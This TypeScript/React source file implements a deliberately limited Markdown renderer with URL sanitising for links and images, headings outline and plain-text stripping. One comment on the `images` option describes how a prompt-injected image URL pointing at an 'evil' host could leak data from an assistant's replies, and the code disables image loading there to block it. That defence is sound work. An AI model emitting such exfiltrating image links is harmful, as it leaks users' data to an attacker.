import type { ReactNode } from "react"

/**
 * A deliberately small Markdown renderer for owner-written text (project case
 * studies, idea notes). It builds React elements, never HTML strings, so
 * nothing in the source can inject markup or script. Supported: headings
 * (#, ##, ###), paragraphs, - / 1. lists, > quotes, ``` code blocks, `code`,
 * **bold**, *italic*, [links](https://…), bare https:// links and images:
 * a line of only ![alt](https://…) is a figure (the alt text is its caption),
 * and two or more of them in a row become a screenshot gallery.
 */
export function Markdown({
  source,
  className,
  outline,
  images = true,
}: {
  source: string
  className?: string
  /**
   * false: image lines become plain links instead of <img>. For text the owner
   * didn't write (the assistant's replies): an image loads with no click, so a
   * prompt-injected ![](https://evil/?d=…) would leak data to that host.
   */
  images?: boolean
  /**
   * Long-form reading (case studies): the body's top heading level becomes an
   * h2 whatever the author typed, and headings get ids for a table of contents
   * (see markdownOutline). Off by default.
   */
  outline?: boolean
}) {
  const options = outline ? outlineOptions(source) : undefined
  return <div className={className}>{renderMarkdown(source, images ? options : { ...(options ?? baseOptions), images: false })}</div>
}

export type OutlineItem = { id: string; text: string; level: 2 | 3 | 4 }

type RenderOptions = { shift: number; ids: Map<number, string>; images?: boolean }
const baseOptions: RenderOptions = { shift: 0, ids: new Map() }

/** "What I built" → "what-i-built"; duplicates get -2, -3. Diacritics fold (Směny → smeny). */
function slugify(text: string, taken: Set<string>) {
  const base =
    markdownToText(text)
      .normalize("NFKD")
      .replace(/[̀-ͯ]/g, "")
      .toLowerCase()
      .replace(/[^\p{L}\p{N}]+/gu, "-")
      .replace(/^-+|-+$/g, "") || "section"
  let id = base
  for (let n = 2; taken.has(id); n++) id = `${base}-${n}`
  taken.add(id)
  return id
}

function outlineOptions(source: string): RenderOptions {
  const blocks = parseBlocks(source)
  const levels = blocks.flatMap((b) => (b.kind === "heading" ? [b.level] : []))
  const top = levels.length ? Math.min(...levels) : 1
  const taken = new Set<string>()
  const ids = new Map<number, string>()
  blocks.forEach((b, i) => {
    if (b.kind === "heading") ids.set(i, slugify(b.text, taken))
  })
  return { shift: top - 1, ids }
}

/** Headings of a long body as `outline` renders them: id, plain text, HTML level. */
export function markdownOutline(source: string): OutlineItem[] {
  const { shift, ids } = outlineOptions(source)
  return parseBlocks(source).flatMap((b, i) =>
    b.kind === "heading"
      ? [{ id: ids.get(i)!, text: markdownToText(b.text), level: (b.level - shift + 1) as 2 | 3 | 4 }]
      : [],
  )
}

type Block =
  | { kind: "heading"; level: 1 | 2 | 3; text: string }
  | { kind: "paragraph"; text: string }
  | { kind: "list"; ordered: boolean; items: string[] }
  | { kind: "quote"; text: string }
  | { kind: "code"; text: string }
  | { kind: "images"; items: MarkdownImage[] }

export type MarkdownImage = { alt: string; src: string }

const IMAGE = /!\[([^\]]*)\]\(([^)\s]+)\)/g
const IMAGE_LINE = /^(?:!\[[^\]]*\]\([^)\s]+\)\s*)+$/

function imagesOf(line: string): MarkdownImage[] {
  return [...line.matchAll(IMAGE)].map((m) => ({ alt: m[1]!.trim(), src: m[2]! }))
}

export function parseBlocks(source: string): Block[] {
  const lines = source.replace(/\r\n?/g, "\n").split("\n")
  const blocks: Block[] = []
  let paragraph: string[] = []

  const flush = () => {
    if (paragraph.length) blocks.push({ kind: "paragraph", text: paragraph.join(" ") })
    paragraph = []
  }

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i]!
    const trimmed = line.trim()

    if (trimmed.startsWith("```")) {
      flush()
      const code: string[] = []
      i++
      while (i < lines.length && !lines[i]!.trim().startsWith("```")) code.push(lines[i++]!)
      blocks.push({ kind: "code", text: code.join("\n") })
      continue
    }
    if (!trimmed) {
      flush()
      continue
    }
    if (IMAGE_LINE.test(trimmed)) {
      flush()
      const last = blocks.at(-1)
      // Image lines with no blank line between them form one gallery.
      if (last?.kind === "images" && lines[i - 1]?.trim()) last.items.push(...imagesOf(trimmed))
      else blocks.push({ kind: "images", items: imagesOf(trimmed) })
      continue
    }
    const heading = /^(#{1,3})\s+(.*)$/.exec(trimmed)
    if (heading) {
      flush()
      blocks.push({ kind: "heading", level: heading[1]!.length as 1 | 2 | 3, text: heading[2]! })
      continue
    }
    const bullet = /^[-*]\s+(.*)$/.exec(trimmed)
    const numbered = /^\d+[.)]\s+(.*)$/.exec(trimmed)
    if (bullet || numbered) {
      flush()
      const ordered = Boolean(numbered)
      const last = blocks.at(-1)
      const item = (bullet ?? numbered)![1]!
      if (last?.kind === "list" && last.ordered === ordered) last.items.push(item)
      else blocks.push({ kind: "list", ordered, items: [item] })
      continue
    }
    const quote = /^>\s?(.*)$/.exec(trimmed)
    if (quote) {
      flush()
      const last = blocks.at(-1)
      if (last?.kind === "quote") last.text += ` ${quote[1]}`
      else blocks.push({ kind: "quote", text: quote[1]! })
      continue
    }
    // A plain line right after a list item continues that item.
    const last = blocks.at(-1)
    if (!paragraph.length && last?.kind === "list" && /^\s+/.test(line)) {
      last.items[last.items.length - 1] += ` ${trimmed}`
      continue
    }
    paragraph.push(trimmed)
  }
  flush()
  return blocks
}

/** Only web, mail and same-site links survive; anything else renders as text. */
export function safeHref(url: string): string | null {
  if (url.startsWith("/") && !url.startsWith("//")) return url
  try {
    const parsed = new URL(url)
    return ["http:", "https:", "mailto:"].includes(parsed.protocol) ? parsed.href : null
  } catch {
    return null
  }
}

/** Images: absolute http(s) or same-site paths only. */
export function safeImageSrc(url: string): string | null {
  const href = safeHref(url)
  return href && !href.startsWith("mailto:") ? href : null
}

const INLINE =
  /(`[^`]+`)|!\[([^\]]*)\]\(([^)\s]+)\)|\*\*(.+?)\*\*|\[([^\]]+)\]\(([^)\s]+)\)|(https?:\/\/[^\s<]+[^\s<.,;:!?)\]'"])|\*([^*\s][^*]*?)\*|(?<![\w])_([^_\s][^_]*?)_(?![\w])/g

export function renderInline(text: string, keyPrefix = "i"): ReactNode[] {
  const out: ReactNode[] = []
  let last = 0
  let n = 0
  for (const match of text.matchAll(INLINE)) {
    const at = match.index
    if (at > last) out.push(text.slice(last, at))
    const key = `${keyPrefix}-${n++}`
    const [whole, code, imageAlt, imageUrl, bold, linkText, linkUrl, bare, italic, italicUnderscore] = match
    if (imageUrl !== undefined) {
      // An image in the middle of a sentence becomes a link to it.
      const href = safeImageSrc(imageUrl)
      const label = imageAlt?.trim() || "image"
      out.push(
        href ? (
          <a key={key} href={href} className={linkClass} {...externalProps(href)}>
            {label}
          </a>
        ) : (
          label
        ),
      )
    } else if (code) {
      out.push(
        <code key={key} className="rounded-md bg-muted px-1 py-0.5 font-mono text-[0.85em]">
          {code.slice(1, -1)}
        </code>,
      )
    } else if (bold) {
      out.push(<strong key={key}>{renderInline(bold, key)}</strong>)
    } else if (linkText && linkUrl) {
      const href = safeHref(linkUrl)
      out.push(
        href ? (
          <a key={key} href={href} className={linkClass} {...externalProps(href)}>
            {renderInline(linkText, key)}
          </a>
        ) : (
          whole
        ),
      )
    } else if (bare) {
      const href = safeHref(bare)
      out.push(
        href ? (
          <a key={key} href={href} className={`${linkClass} break-all`} {...externalProps(href)}>
            {bare}
          </a>
        ) : (
          bare
        ),
      )
    } else if (italic || italicUnderscore) {
      out.push(<em key={key}>{renderInline((italic ?? italicUnderscore)!, key)}</em>)
    }
    last = at + whole.length
  }
  if (last < text.length) out.push(text.slice(last))
  return out
}

const linkClass = "text-primary underline underline-offset-4 hover:no-underline"

function externalProps(href: string) {
  return href.startsWith("/") || href.startsWith("mailto:") ? {} : { rel: "noreferrer", target: "_blank" }
}

export function renderMarkdown(source: string, options?: RenderOptions): ReactNode[] {
  return parseBlocks(source).map((block, i) => {
    const key = `b${i}`
    switch (block.kind) {
      case "heading": {
        // The page title is the h1, so markdown headings start one level down.
        const level = block.level - (options?.shift ?? 0)
        const Tag = (["h2", "h3", "h4"] as const)[level - 1]
        const size = ["text-xl", "text-lg", "text-base"][level - 1]
        return (
          <Tag
            key={key}
            id={options?.ids.get(i)}
            className={`mt-8 mb-2 scroll-mt-24 font-semibold tracking-tight first:mt-0 ${size}`}
          >
            {renderInline(block.text, key)}
          </Tag>
        )
      }
      case "paragraph":
        return (
          <p key={key} className="my-3 leading-7 first:mt-0 last:mb-0">
            {renderInline(block.text, key)}
          </p>
        )
      case "list": {
        const Tag = block.ordered ? "ol" : "ul"
        return (
          <Tag
            key={key}
            className={`my-3 grid gap-1.5 pl-5 leading-7 ${block.ordered ? "list-decimal" : "list-disc"} marker:text-muted-foreground`}
          >
            {block.items.map((item, j) => (
              <li key={j}>{renderInline(item, `${key}-${j}`)}</li>
            ))}
          </Tag>
        )
      }
      case "quote":
        return (
          <blockquote key={key} className="my-4 border-l-2 border-primary pl-4 text-muted-foreground">
            {renderInline(block.text, key)}
          </blockquote>
        )
      case "images":
        if (options?.images === false) return <ImageLinks key={key} items={block.items} />
        return <Figures key={key} items={block.items} />
      case "code":
        return (
          <pre key={key} className="my-4 overflow-x-auto rounded-xl border bg-muted p-3 font-mono text-[13px] leading-6">
            <code>{block.text}</code>
          </pre>
        )
    }
  })
}

/** Images as links, nothing loaded until a click (see Markdown's `images`). */
function ImageLinks({ items }: { items: MarkdownImage[] }) {
  return (
    <p className="my-4">
      {items.map((item, j) => {
        const href = safeImageSrc(item.src)
        const label = item.alt.trim() || "image"
        return (
          <span key={j}>
            {j > 0 && " · "}
            {href ? (
              <a href={href} className={linkClass} {...externalProps(href)}>
                {label}
              </a>
            ) : (
              label
            )}
          </span>
        )
      })}
    </p>
  )
}

/**
 * One image is a figure; several in a row are a two-column gallery. Each opens
 * full size in a new tab; the alt text doubles as the caption.
 */
function Figures({ items }: { items: MarkdownImage[] }) {
  const safe = items.flatMap((item) => {
    const src = safeImageSrc(item.src)
    return src ? [{ ...item, src }] : []
  })
  if (safe.length === 0) return null
  const gallery = safe.length > 1
  return (
    <div className={gallery ? "my-6 grid gap-3 sm:grid-cols-2" : "my-6"} data-gallery={gallery || undefined}>
      {safe.map((item, j) => (
        <figure key={j} className="grid gap-1.5">
          <a
            href={item.src}
            {...externalProps(item.src)}
            className="block overflow-hidden rounded-xl border border-hairline bg-muted outline-none focus-visible:ring-3 focus-visible:ring-ring/50"
          >
            {/* eslint-disable-next-line @next/next/no-img-element -- owner-supplied hosts */}
            <img
              src={item.src}
              alt={item.alt}
              loading="lazy"
              decoding="async"
              className={gallery ? "aspect-[4/3] w-full object-cover object-top" : "h-auto w-full"}
            />
          </a>
          {item.alt && <figcaption className="text-caption text-muted-foreground">{item.alt}</figcaption>}
        </figure>
      ))}
    </div>
  )
}

/** Plain text for previews and search snippets: markdown syntax stripped. */
export function markdownToText(source: string) {
  return source
    .replace(/```[\s\S]*?```/g, " ")
    .replace(/!\[([^\]]*)\]\([^)]*\)/g, "$1")
    .replace(/\[([^\]]+)\]\([^)]+\)/g, "$1")
    .replace(/^#{1,3}\s+|^[-*]\s+|^\d+[.)]\s+|^>\s?/gm, "")
    .replace(/[*_`]/g, "")
    .replace(/\s+/g, " ")
    .trim()
}
